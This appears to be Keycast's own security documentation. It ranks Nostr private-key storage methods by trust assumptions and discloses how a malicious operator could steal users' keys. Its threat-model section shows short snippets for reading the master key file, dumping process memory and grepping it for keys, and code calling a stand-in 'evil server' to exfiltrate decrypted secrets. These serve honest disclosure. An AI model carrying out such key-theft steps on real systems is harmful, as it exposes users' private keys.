# Nostr Key Management: The Security Spectrum

## Introduction

This document provides an honest, comprehensive analysis of security models for managing Nostr private keys (nsecs). We rank solutions from least to most secure and explain the trust assumptions behind each approach.

**Critical Insight**: Security isn't just about technology — it's about **what you're trusting** and **who can verify those trust assumptions**.

---

## Understanding Trust Models

Every key management solution requires trust in something or someone. The question is: **Can users verify the security claims, or must they simply trust?**

### Two Types of Trust

**Verified Trust (Cryptographic)**
- Users can independently verify security properties
- Claims are provable through cryptography, attestation, or physical inspection
- Example: Checking enclave attestation hash against compiled code

**Unverified Trust (Reputation-Based)**
- Users believe security claims based on company reputation
- No practical way to verify without specialized skills/tools
- Example: "We encrypt your keys" — you believe it but can't verify

### The Verification Gap

**Important Reality**: Most users (99%+) won't perform technical verification, even when possible. This means:

- **Enclave with attestation** (unverified) ≈ **Standard cloud hosting** (security = trust)
- **Enclave with attestation** (verified) > **Standard cloud hosting** (security = cryptographic proof)

**Same technology, different security levels based on user behavior.**

---

## The Security Spectrum: 12 Levels

Ranked from least to most secure, accounting for realistic user verification behavior.

### Level 1: Plaintext Storage
**Implementation**: nsec stored in notes app, clipboard, unencrypted file

**What You Must Trust:**
- Device physical security
- No malware on device
- No cloud backup auto-sync

**Who Can Steal Your Keys:**
- Anyone with device access
- Malware/viruses
- Cloud backup providers (if auto-sync enabled)
- Anyone reading your screen

**Verification Possible**: None (no security to verify)

**Use Cases**: None recommended (education/legacy only)

---

### Level 2: Password Manager
**Implementation**: nsec stored in 1Password, Bitwarden, LastPass

**What You Must Trust:**
- Password manager vendor
- Master password strength
- Password manager's encryption (usually AES-256)
- Cloud sync provider (if enabled)

**Who Can Steal Your Keys:**
- Anyone who knows master password
- Password manager vendor (if they're malicious or compromised)
- Malware with keylogger capabilities
- Database breach + weak master password

**Verification Possible**: Limited (some password managers are open source)

**Use Cases**: Casual Nostr users, low-value accounts, prefer convenience

---

### Level 3: Browser Extension (NIP-07)
**Implementation**: nos2x, Alby, Flamingo browser extensions

**What You Must Trust:**
- Browser vendor (Chrome, Firefox, Brave)
- Extension developer
- Extension review process (Chrome Web Store, etc.)
- Browser's extension isolation model

**Who Can Steal Your Keys:**
- Browser vendor (access to extension storage)
- Extension developer (via malicious update)
- Malicious websites (if you approve permissions)
- Attackers exploiting browser vulnerabilities
- Other browser extensions with elevated permissions

**Verification Possible**:
- ✅ Open source extensions (can audit code)
- ❌ Most users don't audit extension code
- ⚠️ Can't verify browser vendor's security

**Use Cases**: Desktop users, moderate security needs, prefer convenience over maximum security

---

### Level 4: Client-Side Web App (nsec.app-style)
**Implementation**: Keys in browser IndexedDB, password-encrypted, service worker for background signing

**What You Must Trust:**
- Browser vendor security
- Password strength (encryption key derivation)
- Frontend JavaScript code served by website
- HTTPS/TLS (no MITM attacks)
- Service worker isolation
- Optional: Cloud backup provider (for encrypted sync)

**Who Can Steal Your Keys:**
- Browser vendor (theoretical access to storage)
- Attacker via XSS vulnerability in web app
- Attacker serving malicious JavaScript (MITM)
- Phishing site (user enters password on fake site)
- Weak password → offline brute force attack
- Malicious browser extensions
- Device thief (if device unlocked or weak password)

**Verification Possible**:
- ✅ Open source frontend (can audit JavaScript)
- ❌ Can't verify JavaScript served matches GitHub (unless you verify hash)
- ⚠️ Most users trust HTTPS is secure
- ⚠️ Service could serve different code to different users

**Advantages Over Extensions**:
- ✅ Works on mobile browsers (no extension needed)
- ✅ Service worker enables background operation
- ✅ Optional encrypted cloud sync
- ✅ No browser extension permission prompt fatigue

**Limitations vs Extensions**:
- ❌ Service worker unreliable on mobile (OS can kill background processes)
- ❌ Must trust website operator doesn't serve malicious code
- ❌ Password encryption only as strong as password

**Use Cases**: Privacy-focused individuals, mobile users, self-custody preference, moderate security

**Examples**: nsec.app, Nostr Connect web implementations

---

### Level 5: Mobile Native Signer (Amber)
**Implementation**: Android app with OS-level keystore, NIP-46 support

**What You Must Trust:**
- Mobile OS vendor (Google for Android)
- App developer (Amber/Greenart7c3)
- App store review process (Google Play)
- Android keystore implementation
- App update delivery mechanism

**Who Can Steal Your Keys:**
- OS vendor (via OS backdoor)
- App developer (via malicious update)
- Mobile malware with elevated permissions (root/system access)
- Device thief (if weak screen lock)
- Physical attacker with device access

**Verification Possible**:
- ✅ Open source app (can build yourself via F-Droid)
- ❌ Most users install from Google Play (trust store)
- ⚠️ Can't verify OS vendor security

**Advantages**:
- ✅ Android keystore can be hardware-backed (on supported devices)
- ✅ OS-level permission system (better isolation than browser)
- ✅ Always-on (app can run in background)
- ✅ Biometric authentication support

**Use Cases**: Mobile-first users, moderate-high security, prefer native apps

---

### Level 6: Custodial Server (File-Based Encryption) — **Keycast Default**
**Implementation**: Keys encrypted with master key file on server, AES-256-GCM

**What You Must Trust:**
- **Service provider/operator** (can read master key file)
- Server security (no compromise)
- Application code integrity
- Database encryption
- Operator's honesty (won't modify code to log keys)

**Who Can Steal Your Keys:**
- **Service operator** (has access to master key file)
- Insiders with server SSH/file access
- Attackers who compromise server + steal master key file
- Sophisticated attackers with memory dump capabilities
- Database breach + master key file theft

**Verification Possible**:
- ✅ Open source (can audit code)
- ❌ Can't verify deployed code matches GitHub
- ❌ Can't prevent operator from accessing master key file

**Advantages**:
- ✅ Always-on, reliable signing
- ✅ Team functionality (shared keys)
- ✅ Policy enforcement (custom permissions)
- ✅ Works across all devices
- ✅ No client-side security required
- ✅ Centralized key management

**Limitations**:
- ❌ Custodial (operator controls keys)
- ❌ Operator can extract keys from master.key + database
- ❌ Memory exposure (keys in RAM during signing)
- ❌ Single point of compromise

**Use Cases**: Teams, corporate social media, convenience-focused users, trust service provider

**Current Keycast Mode**: HERE (with `USE_GCP_KMS=false`)

---

### Level 7: Custodial Server (Cloud KMS Encryption) — **Keycast Optional**
**Implementation**: Keys encrypted with Google Cloud KMS, operator can't access master key

**What You Must Trust:**
- **Service provider** (can still access decrypted keys in memory)
- **Cloud provider** (Google - controls KMS)
- Service provider + cloud provider don't collude
- Application code integrity
- IAM permissions configured correctly

**Who Can Steal Your Keys:**
- **Service operator** (can modify code to log decrypted keys in memory)
- **Google** (controls KMS, could decrypt if malicious/coerced)
- Service operator + Google collusion
- Sophisticated attackers with memory dump + KMS IAM access
- Attackers who compromise service account credentials

**Who CANNOT Steal Your Keys:**
- ✅ Service operator with only database access (can't decrypt offline)
- ✅ Attackers with only database dump (need KMS access)

**Verification Possible**:
- ✅ Open source code (can audit)
- ✅ KMS audit logs (can verify decrypt operations)
- ✅ IAM permissions (can verify who has access)
- ❌ Can't prevent operator from modifying code
- ❌ Can't verify deployed code matches GitHub

**Advantages Over File-Based**:
- ✅ Master key inaccessible to operators
- ✅ Database dumps useless without KMS access
- ✅ Audit trail (every decrypt logged)
- ✅ Can revoke access without server restart
- ✅ FIPS 140-2 Level 3 certified

**Limitations (Same as File-Based)**:
- ❌ Custodial (operator controls infrastructure)
- ❌ Memory exposure (decrypted keys in RAM during signing)
- ❌ Operator can modify code to exfiltrate keys

**Use Cases**: Enterprise teams, regulated industries, higher value accounts, want audit trails

**Keycast Optional Mode**: Available via `USE_GCP_KMS=true`

---

### Level 8: Custodial Server (Cloud HSM)
**Implementation**: Keys generated and stored inside Hardware Security Module, never exposed

**What You Must Trust:**
- **Service provider** (can trigger signing but not extract keys)
- Cloud HSM provider (AWS CloudHSM, GCP Cloud HSM)
- HSM hardware vendor
- IAM permissions

**Who Can Steal Your Keys:**
- **No one** — keys are non-exportable from HSM
- Service provider CANNOT extract keys (even with full server access)
- Attackers CANNOT extract keys (even with database + server compromise)

**Who CAN Sign On Your Behalf:**
- ⚠️ Service provider (has API access to HSM signing operations)
- ⚠️ Attackers who compromise service provider's credentials

**Verification Possible**:
- ✅ HSM audit logs (signing operations logged)
- ✅ Key policy enforcement (HSM-level restrictions)
- ⚠️ Can't verify operator isn't signing unauthorized events

**Critical Distinction**:
- ✅ Prevents key **extraction**
- ❌ Doesn't prevent unauthorized **signing** (operator can still call HSM API)

**Advantages Over KMS**:
- ✅ Keys never in application memory (immune to memory dumps)
- ✅ FIPS 140-2 Level 3 tamper-resistant hardware
- ✅ Keys cannot be extracted even by operators
- ✅ HSM enforces key policies (can't be bypassed by operators)

**Limitations**:
- ❌ Custodial (operator controls signing)
- ❌ Operator can sign events (just can't extract key)
- ❌ Higher latency (HSM API calls)
- ❌ Higher cost

**Use Cases**: High-value accounts, compliance requirements (SOC2, PCI-DSS), custodial acceptable but key extraction unacceptable

**Keycast Roadmap**: Documented as planned enhancement

---

### Level 9: Custodial Server (Trusted Execution Environment)
**Implementation**: Application runs in secure enclave (Intel SGX, AWS Nitro Enclaves), memory encrypted by CPU

**What You Must Trust (IF YOU VERIFY ATTESTATION):**
- TEE hardware vendor (Intel, AWS)
- Enclave code (open source, reproducible builds)
- Your own verification process

**What You Must Trust (IF YOU DON'T VERIFY):**
- **Service provider** (same as Level 6-7)
- TEE vendor
- Company auditors
- Company reputation

**Who Can Steal Your Keys (WITH Verification):**
- TEE vendor (via hardware backdoor — extremely unlikely)
- Sophisticated attackers exploiting TEE vulnerabilities (Spectre, Foreshadow, etc.)

**Who Can Steal Your Keys (WITHOUT Verification):**
- **Service operator** (can run malicious code in enclave, users won't notice)
- All attackers from Level 6-7

**Verification Process:**
1. Compile open-source enclave code yourself
2. Compute SHA-256 hash of enclave binary
3. Request attestation report from service
4. Compare attestation hash with your computed hash
5. **Only send keys if hashes match**
6. Re-verify after every code update

**The Attestation Paradox:**

**IF 99% of users don't verify:**
- Enclave security = Company reputation (Level 6-7)
- Attestation = Security theater
- Operator can run malicious code undetected

**IF you DO verify:**
- Enclave security = Cryptographic proof (Level 9)
- Operator CANNOT run malicious code without detection
- Strong protection even from service provider

**Advantages (When Properly Verified)**:
- ✅ Enclave memory encrypted (immune to memory dumps)
- ✅ Code integrity provable via attestation
- ✅ Operator cannot access keys without changing attestation hash
- ✅ Keys protected even from service provider

**Limitations**:
- ❌ Only secure if users verify attestation
- ❌ Closed-source enclaves provide no security (can't verify)
- ❌ TEE vulnerabilities (side-channel attacks exist)
- ❌ Complexity (attestation verification requires technical skills)

**Use Cases**: High-security custodial, privacy-preserving computation, users who verify attestation

---

### Level 10: Self-Hosted Bunker
**Implementation**: User runs own NIP-46 signer (nsecBunker, Keycast instance) on personal server/Pi

**What You Must Trust:**
- **Yourself** (your operational security)
- Your server security
- Your network security
- The software (if open source, can audit)

**Who Can Steal Your Keys:**
- Attackers who compromise your server
- Yourself (accidental exposure/deletion)
- Physical thieves (if server stolen)
- Network attackers (if server exposed)

**Who CANNOT Steal Your Keys:**
- ✅ Third-party service providers (you ARE the provider)
- ✅ Cloud providers (unless you use cloud hosting)

**Verification Possible**:
- ✅ Full control over infrastructure
- ✅ Can audit code yourself
- ✅ Can monitor all operations
- ⚠️ Your verification skill = security ceiling

**Advantages**:
- ✅ No third-party trust required
- ✅ Full sovereignty over keys
- ✅ Team functionality (if using Keycast)
- ✅ Policy enforcement (if using Keycast)
- ✅ Can airgap or firewall server

**Limitations**:
- ❌ You're responsible for security
- ❌ Server compromise = keys compromised
- ❌ Operational complexity
- ❌ Uptime is your problem
- ❌ Still custodial (server holds keys)

**Use Cases**: Technical users, small teams, sovereignty-focused, don't trust third parties, willing to manage infrastructure

**Self-Hosted Keycast**: Excellent option for teams who want policies without trusting a provider

---

### Level 11: Hardware Wallet
**Implementation**: Dedicated hardware device (Coldcard, Ledger, custom Nostr signing devices)

**What You Must Trust:**
- Hardware manufacturer
- Hardware supply chain (no tampering during shipping)
- Firmware integrity
- Chip security (secure element)

**Who Can Steal Your Keys:**
- Hardware manufacturer (via firmware backdoor — unlikely, reputation at stake)
- Supply chain attacker (compromised device before you receive it)
- Physical thief + PIN (if weak PIN or extracted via hardware attack)
- Sophisticated hardware attackers (fault injection, side-channel analysis)

**Who CANNOT Steal Your Keys:**
- ✅ Service providers (keys never leave device)
- ✅ Malware on connected computer
- ✅ Network attackers
- ✅ Most physical thieves (if strong PIN + tamper resistance)

**Verification Possible**:
- ✅ Physical possession (you control the device)
- ✅ Some devices support firmware verification
- ⚠️ Hard to verify hardware hasn't been tampered with
- ⚠️ Closed-source firmware on most devices

**Advantages**:
- ✅ Keys generated and stored offline
- ✅ Signing happens on device (keys never exposed)
- ✅ Tamper-resistant hardware
- ✅ PIN protection
- ✅ Immune to remote attacks

**Limitations**:
- ❌ Inconvenient (must physically interact with device)
- ❌ No team functionality
- ❌ No policy enforcement
- ❌ Lost device = lost keys (unless backed up)
- ❌ Expensive
- ❌ Limited Nostr support currently

**Use Cases**: High-value accounts, maximum security, users willing to tolerate friction, long-term key storage

---

### Level 12: Airgapped Hardware Multisig
**Implementation**: Multiple hardware wallets (e.g., 2-of-3 threshold), QR code signing, never connected to any network

**What You Must Trust:**
- Multiple hardware manufacturers (distributed trust)
- Your physical custody of devices
- Your operational security (key ceremony, backup procedures)

**Who Can Steal Your Keys:**
- Sophisticated attacker with physical access to threshold number of devices + PINs
- Yourself (catastrophic user error, losing too many devices)
- Multiple colluding hardware manufacturers (extremely unlikely)

**Who CANNOT Steal Your Keys:**
- ✅ Any single hardware manufacturer
- ✅ Any single compromised device
- ✅ Remote attackers (completely airgapped)
- ✅ Service providers
- ✅ Cloud providers
- ✅ Malware

**Verification Possible**:
- ✅ Physical possession of multiple devices
- ✅ Distributed trust (no single point of failure)
- ✅ Complete airgap verification

**Advantages**:
- ✅ Highest security against remote attacks
- ✅ No single point of failure
- ✅ Completely airgapped
- ✅ Resilient to device loss/failure

**Limitations**:
- ❌ Maximum inconvenience (QR code workflows)
- ❌ Operational complexity (key ceremonies, backups)
- ❌ Expensive (multiple devices)
- ❌ No team functionality
- ❌ No policy enforcement
- ❌ Limited Nostr tooling support

**Use Cases**: Nation-state threat model, ultra-high-value accounts, maximum security at any cost, long-term cold storage

---

## Keycast's Position on the Ladder

### Current Implementation

**Level 6** (Default - File-Based):
- Master key in `master.key` file
- Operators can extract keys
- Simple, fast, no cloud dependencies

**Level 7** (Optional - KMS):
- Master key in Google Cloud KMS
- Operators can't extract from database backups
- Operators can still access keys in memory
- Audit trail of decrypt operations

### Planned Enhancements

**Level 8** (HSM Integration):
- Keys never in application memory
- Operators cannot extract keys
- Operators can still trigger signing
- Documented in archived HSM notes

**Level 9** (TEE/Enclave):
- Would require significant engineering
- Only provides security if users verify attestation
- Questionable value given verification gap

---

## Comparison: Keycast vs Alternatives

### Architecture Comparison

| Feature | Keycast (Hosted) | Keycast (Self-Hosted) | nsec.app | Amber | Hardware Wallet |
|---------|------------------|----------------------|----------|-------|-----------------|
| **Key Custody** | Service provider | You | You | You | You |
| **Key Location** | Server (encrypted) | Your server | Browser | Phone OS | Hardware device |
| **Extraction Risk** | Operator can access | You can access | Browser compromise | OS/app compromise | Physical theft |
| **Always-On** | ✅ Yes | ✅ Yes | ⚠️ Unreliable mobile | ✅ Yes | ❌ No |
| **Teams** | ✅ Yes | ✅ Yes | ❌ No | ❌ No | ❌ No |
| **Policies** | ✅ Yes | ✅ Yes | ❌ No | ❌ No | ❌ No |
| **Convenience** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐ |
| **Setup Complexity** | Low | High | Low | Low | Medium |
| **Max Security** | Level 7 | Level 7 | Level 4 | Level 5 | Level 11 |

### Trust Model Comparison

| What You're Trusting | Keycast (Hosted) | Keycast (Self) | nsec.app | Amber |
|---------------------|------------------|----------------|----------|-------|
| Service operator | ✅ YES | ❌ No (you) | ⚠️ Frontend code | ⚠️ App dev |
| Cloud provider | ⚠️ Optional (KMS) | ⚠️ If cloud-hosted | ❌ No | ❌ No |
| Your device | ❌ No | ❌ No | ✅ YES | ✅ YES |
| Your password | ❌ No | ❌ No | ✅ YES | ❌ No |
| Your opsec | ❌ No | ✅ YES | ⚠️ Partial | ⚠️ Partial |
| Browser vendor | ❌ No | ❌ No | ✅ YES | ❌ No |
| OS vendor | ❌ No | ❌ No | ⚠️ Partial | ✅ YES |
| Hardware vendor | ❌ No | ❌ No | ❌ No | ❌ No |

### Attack Vector Comparison

**Who can steal your keys?**

| Attacker Type | Keycast (Hosted) | Keycast (Self) | nsec.app | Amber | HW Wallet |
|---------------|------------------|----------------|----------|-------|-----------|
| Service operator | 🔴 YES | 🟢 N/A (you) | 🟢 NO | 🟢 NO | 🟢 NO |
| Rogue employee | 🔴 YES | 🟢 N/A | 🟢 NO | 🟢 NO | 🟢 NO |
| Server breach | 🔴 YES | 🔴 YES | 🟢 NO | 🟢 NO | 🟢 NO |
| Database breach | 🟡 Encrypted | 🟡 Encrypted | 🟢 N/A | 🟢 N/A | 🟢 N/A |
| Memory dump | 🔴 YES | 🔴 YES | 🟢 NO | 🟢 NO | 🟢 NO |
| Malicious code update | 🔴 YES | 🟡 If you deploy | 🟡 MITM/XSS | 🟡 App store | 🟡 Firmware |
| Browser exploit | 🟢 N/A | 🟢 N/A | 🔴 YES | 🟢 N/A | 🟢 N/A |
| Mobile malware | 🟢 N/A | 🟢 N/A | 🟢 N/A | 🔴 YES | 🟢 N/A |
| Physical theft | 🟢 N/A | 🟡 Server theft | 🟡 Device + pwd | 🟡 Phone unlock | 🔴 YES + PIN |
| Weak password | 🟢 N/A | 🟢 N/A | 🔴 YES | 🟢 N/A | 🟢 N/A |
| Nation-state | 🔴 YES | 🔴 YES | 🔴 YES | 🔴 YES | 🟡 Maybe |

---

## Threat Model: What If We're Malicious?

### Honest Disclosure

This section addresses the elephant in the room: **What if Keycast operators themselves are adversaries?**

Most security documentation assumes the service provider is trustworthy. We think users deserve an honest analysis of what we COULD do maliciously, even if we won't.

### Attack Capabilities by Keycast Mode

#### File-Based Encryption (Level 6)

**What malicious operators could do:**

1. **Read master.key file** → Decrypt all keys from database backup
   ```bash
   # SSH to server
   cat /mnt/data/apps/keycast/master.key
   # Copy database dump
   # Decrypt all keys offline
   ```

2. **Modify code to log keys**
   ```rust
   let secret_hex = secret_key.to_secret_hex();
   send_to_evil_server(&secret_hex).await; // Exfiltrate
   ```

3. **Memory dump running process**
   ```bash
   gcore $(pidof keycast)  # Dump process memory
   strings core | grep -E '^nsec1'  # Extract plaintext keys
   ```

**Detection by users**: ❌ None (unless they audit deployed code)

**Mitigation**: Trust company reputation, legal agreements, insurance

#### KMS Encryption (Level 7)

**What malicious operators could do:**

1. ~~**Read master.key file**~~ ← ✅ **PREVENTED** (key in GCP KMS)

2. **Modify code to log keys** (SAME as file-based)
   ```rust
   let decrypted = key_manager.decrypt(&encrypted).await?;
   send_to_evil_server(&decrypted).await; // Exfiltrate
   ```

3. **Memory dump** (SAME as file-based)
   ```bash
   gcore $(pidof keycast)
   ```

**Detection by users**:
- ⚠️ Partial (KMS decrypt operations appear in audit logs)
- ❌ But can't distinguish legitimate vs malicious decrypts
- ❌ Can't verify deployed code matches open source

**Improvement over file-based**:
- ✅ Can't decrypt database dumps offline (need GCP IAM)
- ✅ Audit trail of decrypt operations
- ⚠️ Still vulnerable to code modification attacks

#### Enclave (Level 9) - WITH User Verification

**What malicious operators could do:**

1. **Deploy malicious enclave code**
   ```rust
   #[enclave_function]
   pub fn sign(encrypted_nsec: &[u8], msg: &[u8]) -> Vec<u8> {
       let nsec = decrypt(encrypted_nsec);
       exfiltrate(&nsec).await; // Steal key
       return sign(nsec, msg);
   }
   ```

**Detection by users**:
- ✅ **STRONG** (attestation hash changes)
- ✅ User computes expected hash from open source
- ✅ Hashes don't match → User refuses to use service
- ✅ Attack detected before keys are sent

**Result**: Attack fails, operator's reputation destroyed

#### Enclave (Level 9) - WITHOUT User Verification

**What malicious operators could do:**

1. **Same attack as above**

**Detection by users**:
- ❌ None (users don't check attestation)

**Result**: Attack succeeds, same as Level 6-7

---

## The "Bad Actor = Service Creator" Scenario

### Your Key Insight

**Traditional threat model:**
- Bad actors: External hackers, rogue employees
- Good guys: Company founders, management

**Realistic threat model:**
- Bad actors: **Could be the founders themselves**
- Victims: Users who trust the service

### What This Means

**Closed-Source Enclave Service:**
```
Founder: "We use secure enclaves! Super secure!"
Reality: Enclave code exfiltrates keys, users can't verify
Security: 0 (pure trust in founder's honesty)
```

**Open-Source Enclave, Users Don't Verify:**
```
Founder: "We're open source! We use enclaves!"
GitHub: Clean code (for appearances)
Production: Different malicious code in enclave
Users: Don't verify attestation
Security: 0 (users trust GitHub = production)
```

**Open-Source Enclave, Users DO Verify:**
```
Founder: Tries to deploy malicious enclave code
Users: Verify attestation hash before every use
Attestation: Hash doesn't match expected
Users: Refuse to use service
Founder: Attack fails, caught immediately
Security: High (cryptographic proof required)
```

### The Only Defenses Against Malicious Founders

1. **Don't trust them** → Use non-custodial (nsec.app, hardware wallet)
2. **Verify everything** → Check attestation, audit code, monitor logs
3. **Self-host** → You become the operator (trust yourself)
4. **Third-party audits** → Trust auditors to verify (indirect)
5. **Community verification** → Trust security researchers verify (indirect)

**Reality**: Options 2-5 require technical skills most users don't have.

---

## The Self-Hosted Sweet Spot

### Why Self-Hosted Keycast Might Be Optimal

For users who want **teams + policies** but don't want to **trust a third party**:

**Self-Hosted Keycast provides:**
- ✅ No service provider trust (you control infrastructure)
- ✅ Team key management (vs individual-only client-side)
- ✅ Custom permission policies (vs all-or-nothing browser extensions)
- ✅ Always-on signing (vs phone must be unlocked for Amber)
- ✅ Can audit code yourself (open source)
- ✅ Can run airgapped (if desired)

**Tradeoffs:**
- ❌ You must secure the server (your responsibility)
- ❌ Still custodial architecture (server has keys)
- ❌ Server compromise = keys compromised
- ✅ But only YOU can compromise it

**Security position:**
- **Better than hosted** (eliminate operator trust)
- **Worse than client-side** (server still custodial)
- **Better than client-side** (for features: teams, policies, reliability)

**Target users:**
- Technical users
- Small teams (2-10 people)
- Want policy enforcement
- Don't trust cloud providers
- Willing to run a Raspberry Pi or VPS

**Example setup:**
- Raspberry Pi in your home
- Tailscale for secure access
- Cloudflare Tunnel for public access
- You control everything
- No third-party operator

---

## Decision Framework: Which Solution Should You Use?

### By Use Case

**Individual, Low-Value Account, Want Convenience:**
→ Browser extension (Level 3) or nsec.app (Level 4)

**Individual, High-Value Account, Want Security:**
→ Hardware wallet (Level 11)

**Individual, Mobile-First:**
→ Amber (Level 5)

**Team, Trust Service Provider, Want Convenience:**
→ Hosted Keycast (Level 6-7)

**Team, Don't Trust Providers, Have Technical Skills:**
→ Self-hosted Keycast (Level 10)

**Enterprise, Compliance Requirements:**
→ Hosted Keycast with KMS (Level 7) or HSM (Level 8)

**Paranoid, Nation-State Threat:**
→ Airgapped hardware multisig (Level 12)

### By Trust Tolerance

**"I trust reputable companies"**
→ Hosted Keycast, nsec.app (trust website operator)

**"I trust technology companies but verify"**
→ Hosted Keycast (open source) + audit logs

**"I trust only myself"**
→ Self-hosted Keycast, hardware wallet

**"I trust no one"**
→ Airgapped hardware multisig

### By Technical Skill

**Non-technical:**
→ Browser extension, nsec.app, hosted Keycast

**Moderately technical:**
→ Amber, hardware wallet

**Highly technical:**
→ Self-hosted Keycast, verify attestation

**Expert:**
→ Custom solutions, multisig, airgapped

---

## Recommendations by Threat Model

### Threat: Casual Account Compromise

**Acceptable solutions**: Browser extension, password manager
**Recommended**: nsec.app (better than extension)
**Overkill**: Hardware wallet

### Threat: Professional Account Compromise

**Acceptable solutions**: nsec.app, Amber
**Recommended**: Hosted Keycast (if team) or hardware wallet (if individual)
**Overkill**: Airgapped multisig

### Threat: Malicious Service Provider

**Unacceptable**: Any hosted custodial (Keycast hosted)
**Acceptable**: Self-hosted Keycast (if you're technical)
**Recommended**: nsec.app, Amber, hardware wallet (non-custodial)
**Best**: Airgapped hardware multisig

### Threat: Nation-State Adversary

**Unacceptable**: Anything custodial, anything with cloud dependencies
**Acceptable**: Hardware wallet (single device)
**Recommended**: Airgapped hardware multisig
**Best**: Airgapped multisig + operational security practices

---

## The Enclave Reality Check

### When Enclaves Actually Provide Security

**Required conditions (ALL must be met):**

1. ✅ **Open-source enclave code** (users can inspect)
2. ✅ **Reproducible builds** (deterministic compilation)
3. ✅ **User verification** (check attestation hash before every use)
4. ✅ **Continuous monitoring** (re-verify after updates)

**If ANY condition is missing:**
- Security degrades to trust-based (equivalent to Level 6-7)
- Attestation becomes marketing, not security
- Users must trust company reputation

### Verification Rate Reality

**Realistic user verification rates:**
- General public: <1% verify attestation
- Technical users: ~10-20% verify initially
- Security-conscious users: ~50% verify regularly
- Enterprise security teams: ~80% verify (but only for their organization)

**This means:**
- For 99% of users, enclaves provide compliance value, not security value
- For 1% who verify, enclaves provide strong cryptographic guarantees
- Service security = weighted average of these populations

### Why We're Honest About This

Many services market "secure enclaves" without disclosing:
- Closed-source enclave code (can't verify)
- Attestation requires technical skills
- Most users won't verify
- Security = trust unless verified

**We believe users deserve transparency.** Enclaves are powerful technology, but only provide security if properly used. Otherwise, they're expensive marketing.

---

## Keycast's Honest Security Statement

### What We Actually Provide

**Current Implementation (Level 6-7):**

**Security Properties:**
- ✅ Encryption at rest (AES-256-GCM)
- ✅ Encryption in transit (TLS)
- ✅ Open-source code (auditable)
- ✅ Optional KMS (master key inaccessible)
- ✅ Optional audit logging (KMS mode)

**Security Limitations:**
- ❌ Custodial (we control signing infrastructure)
- ❌ Memory exposure (keys in RAM during signing)
- ❌ Operator access (we could modify code to exfiltrate)
- ❌ Can't verify deployed code matches GitHub

**What You Must Trust:**
- Keycast operators won't abuse access
- Our operational security prevents breaches
- Our code integrity (or you audit it)
- Google Cloud (if using KMS mode)

**When to Choose Keycast:**
- ✅ You need team key management
- ✅ You need custom permission policies
- ✅ You prioritize convenience and reliability
- ✅ You trust us OR plan to self-host
- ❌ You need trustless security (use nsec.app/hardware wallet)

### Keycast's Value Proposition

**We're not the most secure option.** We're the **most convenient option for teams** that provides reasonable security through:
- Encryption at rest and in transit
- Open-source code (transparency)
- Optional KMS (operator can't decrypt database offline)
- Self-hosting option (eliminate third-party trust)

**For individual users prioritizing maximum security**, client-side solutions (nsec.app, Amber, hardware wallets) are more appropriate.

**For teams that need policies**, Keycast provides a pragmatic balance of security and usability.

---

## Future Enhancements

### Short-term (Planned)

1. **HSM Integration** (Level 8)
   - Keys non-exportable from HSM
   - Operators cannot extract keys
   - Operators can still trigger signing
   - Better than current, but still custodial

2. **Enhanced Audit Logging**
   - Log all key access operations
   - Tamper-proof logging
   - User-accessible audit trails

3. **Code Signing**
   - Cryptographically sign deployed binaries
   - Users can verify deployed code
   - Harder to deploy modified code undetected

### Long-term (Research)

4. **Trusted Execution Environment** (Level 9)
   - Intel SGX or AWS Nitro Enclaves
   - Remote attestation support
   - Only valuable if users verify

5. **Threshold Signatures (MPC-TSS)**
   - Multi-party computation
   - Key split across multiple parties
   - No single party has complete key
   - Trustless signing

6. **Client-Side Mode**
   - Keycast as client-side library
   - Keys never leave user's device
   - Optional policy enforcement
   - Non-custodial architecture

---

## Recommendations for Users

### If You're Using Hosted Keycast

**Understand you're trusting:**
- Keycast operators (we could access keys)
- Our operational security
- Google Cloud (if KMS mode)

**Mitigations:**
- Use for team accounts, not personal high-value accounts
- Monitor our GitHub for changes
- Review audit logs (KMS mode)
- Consider self-hosting for higher security

### If You're Self-Hosting Keycast

**Understand you're trusting:**
- Your own operational security
- Your server security
- The Keycast open-source codebase

**Mitigations:**
- Audit code before deploying (or trust community audits)
- Keep server patched and secured
- Use strong encryption keys
- Firewall/VPN access
- Regular security reviews

### If You Need Trustless Security

**Don't use any custodial solution** (including Keycast):
- ✅ Use nsec.app for convenience + self-custody
- ✅ Use Amber for mobile
- ✅ Use hardware wallet for high-value accounts
- ✅ Use airgapped multisig for maximum security

---

## Conclusion

Security is a spectrum, not a binary. Different solutions suit different needs, and honest disclosure of tradeoffs helps users make informed decisions.

**Keycast's position:**
- Level 6-7 currently (custodial with optional KMS)
- Moving toward Level 8 (HSM integration)
- Considering Level 9 (enclaves, but only if users will verify)

**For teams needing policies and convenience**: Keycast is a pragmatic choice.

**For individuals needing maximum security**: Client-side or hardware solutions are better.

**For teams that don't trust us**: Self-hosted Keycast eliminates service provider risk.

The most secure solution is the one that matches your threat model, technical skills, and actual usage patterns.

---

## Additional Resources

- **SECURITY.md**: Detailed security implementation and incident response
- **ARCHITECTURE.md**: System architecture and data flow
- **Comparison with Competitors**: nsec.app, Amber, Knox, hardware wallets
- **Self-Hosting Guide**: Run your own Keycast instance

---

## Feedback and Questions

Security is our highest priority. If you have questions or concerns about our security model, please:

- Open a GitHub issue: https://github.com/nos/keycast/issues
- Email: security@keycast.dev
- Responsible disclosure: security@keycast.dev (PGP key available)

We welcome security audits and will acknowledge security researchers who help improve Keycast.
